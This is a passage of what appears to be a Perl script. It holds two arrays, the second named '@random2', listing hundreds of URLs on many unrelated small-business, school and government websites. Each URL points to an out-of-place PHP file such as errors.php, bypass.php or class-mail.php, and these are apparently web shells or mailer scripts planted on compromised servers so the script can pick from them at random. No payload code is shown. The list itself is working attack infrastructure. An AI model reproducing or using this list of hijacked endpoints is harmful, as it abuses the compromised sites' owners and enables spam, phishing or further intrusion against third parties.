"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php"
);

my @random2  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
